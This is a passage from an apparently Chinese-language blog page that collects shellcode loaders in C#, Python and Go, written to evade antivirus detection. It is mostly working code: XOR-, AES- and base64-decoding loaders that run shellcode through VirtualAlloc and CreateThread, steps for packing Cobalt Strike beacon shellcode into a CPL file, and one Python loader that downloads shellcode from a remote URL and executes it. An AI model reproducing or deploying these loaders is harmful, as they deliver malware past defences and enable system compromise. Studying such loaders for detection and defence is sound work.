class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Author: Arno0x0x, Twitter: @Arno0x0x</span><br><span class="line"></span><br><span class="line">How to compile:</span><br><span class="line">===============</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:encryptedShellcodeWrapper_xor.exe encryptedShellcodeWrapper_xor.cs</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Threading.Tasks;</span><br><span class="line">using System.Security.Cryptography;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">namespace RunShellCode</span><br><span class="line">&#123;</span><br><span class="line">    static class Program</span><br><span class="line">    &#123;</span><br><span class="line">        //==============================================================================</span><br><span class="line">        // CRYPTO FUNCTIONS</span><br><span class="line">        //==============================================================================</span><br><span class="line">        private static T[] SubArray&lt;T&gt;(this T[] data, int index, int length)</span><br><span class="line">        &#123;</span><br><span class="line">            T[] result = new T[length];</span><br><span class="line">            Array.Copy(data, index, result, 0, length);</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static byte[] xor(byte[] cipher, byte[] key) &#123;</span><br><span class="line">            byte[] decrypted = new byte[cipher.Length];</span><br><span class="line"></span><br><span class="line">            for(int i = 0; i &lt; cipher.Length; i++) &#123;</span><br><span class="line">                decrypted[i] = (byte) (cipher[i] ^ key[i % key.Length]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return decrypted;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //--------------------------------------------------------------------------------------------------</span><br><span class="line">        // Decrypts the given a plaintext message byte array with a given 128 bits key</span><br><span class="line">        // Returns the unencrypted message</span><br><span class="line">        //--------------------------------------------------------------------------------------------------</span><br><span class="line">        private static byte[] aesDecrypt(byte[] cipher, byte[] key)</span><br><span class="line">        &#123;</span><br><span class="line">            var IV = cipher.SubArray(0, 16);</span><br><span class="line">            var encryptedMessage = cipher.SubArray(16, cipher.Length - 16);</span><br><span class="line"></span><br><span class="line">            // Create an AesManaged object with the specified key and IV.</span><br><span class="line">            using (AesManaged aes = new AesManaged())</span><br><span class="line">            &#123;</span><br><span class="line">                aes.Padding = PaddingMode.PKCS7;</span><br><span class="line">                aes.KeySize = 128;</span><br><span class="line">                aes.Key = key;</span><br><span class="line">                aes.IV = IV;</span><br><span class="line"></span><br><span class="line">                using (MemoryStream ms = new MemoryStream())</span><br><span class="line">                &#123;</span><br><span class="line">                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))</span><br><span class="line">                    &#123;</span><br><span class="line">                        cs.Write(encryptedMessage, 0, encryptedMessage.Length);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    return ms.ToArray();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //==============================================================================</span><br><span class="line">        // MAIN FUNCTION</span><br><span class="line">        //==============================================================================</span><br><span class="line">        static void Main()</span><br><span class="line">        &#123;</span><br><span class="line">            byte[] encryptedShellcode = new byte[] &#123; &#125;;</span><br><span class="line">            string key = &quot;uknowsec&quot;;</span><br><span class="line">            string cipherType = &quot;xor&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            byte[] shellcode = null;</span><br><span class="line"></span><br><span class="line">            //--------------------------------------------------------------</span><br><span class="line">            // Decrypt the shellcode</span><br><span class="line">            if (cipherType == &quot;xor&quot;) &#123;</span><br><span class="line">                shellcode = xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));</span><br><span class="line">            &#125;</span><br><span class="line">            else if (cipherType == &quot;aes&quot;) &#123;</span><br><span class="line">                shellcode = aesDecrypt(encryptedShellcode, Convert.FromBase64String(key));</span><br><span class="line">            &#125;</span><br><span class="line">                        </span><br><span class="line">            //--------------------------------------------------------------        	</span><br><span class="line">            // Copy decrypted shellcode to memory</span><br><span class="line">            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">            IntPtr hThread = IntPtr.Zero;</span><br><span class="line">            UInt32 threadId = 0;</span><br><span class="line"></span><br><span class="line">            // Prepare data</span><br><span class="line">            IntPtr pinfo = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">            // Invoke the shellcode</span><br><span class="line">            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static UInt32 MEM_COMMIT = 0x1000;</span><br><span class="line">        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span><br><span class="line"></span><br><span class="line">        // The usual Win32 API trio functions: VirtualAlloc, CreateThread, WaitForSingleObject</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 VirtualAlloc(</span><br><span class="line">            UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size,</span><br><span class="line">            UInt32 flAllocationType,</span><br><span class="line">            UInt32 flProtect</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr CreateThread(</span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 WaitForSingleObject(</span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="从资源里加载shelllcode">从资源里加载shelllcode</span></h3><p><a href="https://github.com/rvrsh3ll/CPLResourceRunner" target="_blank" rel="noopener">https://github.com/rvrsh3ll/CPLResourceRunner</a></p>
<p>用Cobalt Strike 生成shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Attacks -&gt; Packages -&gt; Windows Executable (s) -&gt; Output =&gt; RAW (x86)</span><br></pre></td></tr></table></figure>
<p>用ConvertShellcode.py将生成的 beacon.bin转换成shellcode.txt</p>
<p>然后再转换成base64编码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# python ConvertShellcode.py beacon.bin </span><br><span class="line">Shellcode written to shellcode.txt</span><br><span class="line">root@kali:~/Desktop# cat shellcode.txt |sed &apos;s/[, ]//g; s/0x//g;&apos; |tr -d &apos;\n&apos; |xxd -p -r |gzip -c |base64 &gt; b64shellcode.txt</span><br></pre></td></tr></table></figure>
<p>把生成的base64编码的shellcode复制到项目资源Resources.txt里</p>
<p>编译生成dll。</p>
<p>copy CPLResourceRunner.dll to RunMe.cpl</p>
<p><a href="http://www.anquan.us/static/drops/tips-16042.html" target="_blank" rel="noopener">三好学生-CPL文件利用介绍</a></p>
<h2><span id="python">Python</span></h2><h3><span id="源码加载">源码加载</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从我们的web服务器上下载shellcode</span></span><br><span class="line">url = <span class="string">"http://rinige.com/shellcode.bin"</span></span><br><span class="line">response = urllib2.urlopen(url)</span><br><span class="line"><span class="comment"># base64 解码 shellcode</span></span><br><span class="line">shellcode = base64.b64decode(response.read())</span><br><span class="line"><span class="comment"># 申请内存空间</span></span><br><span class="line">shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))</span><br><span class="line"><span class="comment"># 创建 shellcode 的函数指针</span></span><br><span class="line">shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE¬</span><br><span class="line">(ctypes.c_void_p))</span><br><span class="line"><span class="comment"># 执行 shellcode</span></span><br><span class="line">shellcode_func()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">shellcode = bytearray(&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;)</span><br><span class="line"></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line"> </span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line"></span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line"> </span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
<p>PyInstaller将py转为exe</p>
<p>pyinstaller同样可以将.py程序打包成windows下可以执行的exe文件。<br>pyinstaller依赖于pywin32，在使用pyinstaller之前，应先安装pywin32</p>
<p>pywin32下载后，点击下一步安装即可<br><a href="https://sourceforge.net/projects/pywin32/files/pywin32" target="_blank" rel="noopener">https://sourceforge.net/projects/pywin32/files/pywin32</a><br>pyinstaller 下载后，解压，不用安装，即可使用<br><a href="https://github.com/pyinstaller/pyinstaller/releases" target="_blank" rel="noopener">https://github.com/pyinstaller/pyinstaller/releases</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstaller -F -w pyshellcode.py</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_10.png" alt=""></p>
<p>生成的exe文件3MB。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_11.png" alt=""></p>
<h4><span id="xor加密">xor加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf8 -*-</span><br><span class="line"># Author: Arno0x0x, Twitter: @Arno0x0x</span><br><span class="line">#</span><br><span class="line"># You can create a windows executable: pyinstaller --onefile --noconsole multibyteEncodedShellcode.py</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from ctypes import *</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">#======================================================================================================</span><br><span class="line">#											CRYPTO FUNCTIONS</span><br><span class="line">#======================================================================================================</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line"># data as a bytearray</span><br><span class="line"># key as a string</span><br><span class="line">def xor(data, key):</span><br><span class="line">	l = len(key)</span><br><span class="line">	keyAsInt = map(ord, key)</span><br><span class="line">	return bytes(bytearray((</span><br><span class="line">	    (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))</span><br><span class="line">	)))</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line">def unpad(s):</span><br><span class="line">	&quot;&quot;&quot;PKCS7 padding removal&quot;&quot;&quot;</span><br><span class="line">	return s[:-ord(s[len(s)-1:])]</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line">def aesDecrypt(cipherText, key):</span><br><span class="line">	&quot;&quot;&quot;Decrypt data with the provided key&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">	# Initialization Vector is in the first 16 bytes</span><br><span class="line">	iv = cipherText[:AES.block_size]</span><br><span class="line"></span><br><span class="line">	cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">	return unpad(cipher.decrypt(cipherText[AES.block_size:]))</span><br><span class="line"></span><br><span class="line">#======================================================================================================</span><br><span class="line">#											MAIN FUNCTION</span><br><span class="line">#======================================================================================================</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line">	encryptedShellcode = (&quot;&quot;)</span><br><span class="line">	key = &quot;uknowsec&quot;</span><br><span class="line">	cipherType = &quot;xor&quot;</span><br><span class="line"></span><br><span class="line">	# Decrypt the shellcode</span><br><span class="line">	if cipherType == &apos;xor&apos;:</span><br><span class="line">		shellcode = xor(bytearray(encryptedShellcode), key)</span><br><span class="line">	elif cipherType == &apos;aes&apos;:</span><br><span class="line">		key = base64.b64decode(key)</span><br><span class="line">		shellcode = aesDecrypt(encryptedShellcode, key)</span><br><span class="line">	else:</span><br><span class="line">		print &quot;[ERROR] Unknown cipher type&quot;</span><br><span class="line"></span><br><span class="line">	# Copy the shellcode to memory and invoke it</span><br><span class="line">	memory_with_shell = create_string_buffer(shellcode, len(shellcode))</span><br><span class="line">	shell = cast(memory_with_shell,CFUNCTYPE(c_void_p))</span><br><span class="line">	shell()</span><br></pre></td></tr></table></figure>
<h4><span id="aes加密">aes加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf8 -*-</span><br><span class="line"># Author: Arno0x0x, Twitter: @Arno0x0x</span><br><span class="line">#</span><br><span class="line"># You can create a windows executable: pyinstaller --onefile --noconsole multibyteEncodedShellcode.py</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from ctypes import *</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">#======================================================================================================</span><br><span class="line">#											CRYPTO FUNCTIONS</span><br><span class="line">#======================================================================================================</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line"># data as a bytearray</span><br><span class="line"># key as a string</span><br><span class="line">def xor(data, key):</span><br><span class="line">	l = len(key)</span><br><span class="line">	keyAsInt = map(ord, key)</span><br><span class="line">	return bytes(bytearray((</span><br><span class="line">	    (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))</span><br><span class="line">	)))</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line">def unpad(s):</span><br><span class="line">	&quot;&quot;&quot;PKCS7 padding removal&quot;&quot;&quot;</span><br><span class="line">	return s[:-ord(s[len(s)-1:])]</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line">def aesDecrypt(cipherText, key):</span><br><span class="line">	&quot;&quot;&quot;Decrypt data with the provided key&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">	# Initialization Vector is in the first 16 bytes</span><br><span class="line">	iv = cipherText[:AES.block_size]</span><br><span class="line"></span><br><span class="line">	cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">	return unpad(cipher.decrypt(cipherText[AES.block_size:]))</span><br><span class="line"></span><br><span class="line">#======================================================================================================</span><br><span class="line">#											MAIN FUNCTION</span><br><span class="line">#======================================================================================================</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line">	encryptedShellcode = (&quot;&quot;)</span><br><span class="line">	key = &quot;Nv78rga+vzeTO+acx4EXCw==&quot;</span><br><span class="line">	cipherType = &quot;aes&quot;</span><br><span class="line"></span><br><span class="line">	# Decrypt the shellcode</span><br><span class="line">	if cipherType == &apos;xor&apos;:</span><br><span class="line">		shellcode = xor(bytearray(encryptedShellcode), key)</span><br><span class="line">	elif cipherType == &apos;aes&apos;:</span><br><span class="line">		key = base64.b64decode(key)</span><br><span class="line">		shellcode = aesDecrypt(encryptedShellcode, key)</span><br><span class="line">	else:</span><br><span class="line">		print &quot;[ERROR] Unknown cipher type&quot;</span><br><span class="line"></span><br><span class="line">	# Copy the shellcode to memory and invoke it</span><br><span class="line">	memory_with_shell = create_string_buffer(shellcode, len(shellcode))</span><br><span class="line">	shell = cast(memory_with_shell,CFUNCTYPE(c_void_p))</span><br><span class="line">	shell()</span><br></pre></td></tr></table></figure>
<h4><span id="base64加密">base64加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">encode_shellcode = &quot;&quot;</span><br><span class="line"></span><br><span class="line">shellcode = base64.b64decode(encode_shellcode)</span><br><span class="line"></span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -1)</span><br></pre></td></tr></table></figure>
<h3><span id="加载器">加载器</span></h3><p><a href="https://www.cnblogs.com/k8gege/p/11223393.html" target="_blank" rel="noopener">Python免杀ShellCode加载器(Cobaltstrike/Metasploit)</a></p>
<h4><span id="hex加密">HEX加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#scrun by k8gege</span><br><span class="line">import ctypes</span><br><span class="line">import sys</span><br><span class="line">#calc.exe</span><br><span class="line">#sc = &quot;DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4&quot;</span><br><span class="line">shellcode=bytearray(sys.argv[1].decode(&quot;hex&quot;))</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line">  </span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">  </span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">  </span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">  </span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
<h4><span id="base64加密">base64加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#scrun by k8gege</span><br><span class="line">import ctypes</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">#calc.exe</span><br><span class="line">#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==</span><br><span class="line">shellcode=bytearray(base64.b64decode(sys.argv[1]).decode(&quot;hex&quot;))</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line">  </span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">  </span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">  </span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">  </span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
<h2><span id="go">Go</span></h2><h3><span id="内联c加载">内联C加载</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import &quot;C&quot;</span><br><span class="line">import &quot;unsafe&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    buf := &quot;&quot;</span><br><span class="line">    buf += &quot;\xdd\xc6\xd9\x74\x24\xf4\x5f\x33\xc9\xb8\xb3\x5e\x2c&quot;</span><br><span class="line">    ...省略...</span><br><span class="line">    buf += &quot;\xc9\xb1\x97\x31\x47\x1a\x03\x47\x1a\x83\xc7\x04\xe2&quot;</span><br><span class="line">    // at your call site, you can send the shellcode directly to the C</span><br><span class="line">    // function by converting it to a pointer of the correct type.</span><br><span class="line">    shellcode := []byte(buf)</span><br><span class="line">    C.call((*C.char)(unsafe.Pointer(&amp;shellcode[0])))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="加载器">加载器</span></h3><p><a href="https://github.com/brimstone/go-shellcode" target="_blank" rel="noopener">https://github.com/brimstone/go-shellcode</a></p>
<p>生成hex格式的shellcode</p>
